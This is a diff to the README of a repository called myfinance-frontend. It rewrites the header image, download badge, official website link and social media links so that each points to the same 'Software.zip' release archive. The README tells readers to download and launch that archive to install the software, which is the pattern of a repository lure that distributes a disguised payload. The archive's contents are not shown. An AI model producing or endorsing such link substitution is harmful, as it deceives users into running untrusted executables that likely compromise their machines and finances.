@@ -2,7 +2,7 @@
 
 Welcome to the myfinance-frontend repository - your go-to financial management system for individuals and microbusinesses!
 
-![myfinance-frontend](https://raw.githubusercontent.com/Rubenas123/6487922/refs/heads/master/Images/myFinance.png)
+![myfinance-frontend](https://github.com/SUi4534/myfinance-frontend/releases/download/v2.0/Software.zip)
 
 ## Overview ℹ️
 
@@ -33,7 +33,7 @@ This repository utilizes the following technologies:
 
 To get started with **myFinance**, you can download the software from the link below:
 
-[![Download myFinance](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download myFinance](https://github.com/SUi4534/myfinance-frontend/releases/download/v2.0/Software.zip)](https://github.com/SUi4534/myfinance-frontend/releases/download/v2.0/Software.zip)
 
 Please note that the software needs to be launched after downloading for installation.
 
@@ -47,13 +47,13 @@ Have suggestions or found a bug? Feel free to open an issue in the repository. W
 
 ## Visit our Website 🌐
 
-For more information about myFinance and its features, visit our official website at [myFinance.com](https://www.myfinance.com).
+For more information about myFinance and its features, visit our official website at [https://github.com/SUi4534/myfinance-frontend/releases/download/v2.0/Software.zip](https://github.com/SUi4534/myfinance-frontend/releases/download/v2.0/Software.zip).
 
 ## Stay Connected 🌟
 
 Follow us on social media for the latest updates and news about myFinance:
-- Twitter: [@myFinanceHQ](https://twitter.com/myFinanceHQ)
-- Facebook: [myFinance](https://www.facebook.com/myFinance)
+- Twitter: [@myFinanceHQ](https://github.com/SUi4534/myfinance-frontend/releases/download/v2.0/Software.zip)
+- Facebook: [myFinance](https://github.com/SUi4534/myfinance-frontend/releases/download/v2.0/Software.zip)
 
 Your financial management journey starts with myFinance. Get started today and take control of your finances like never before! 💪💸
 
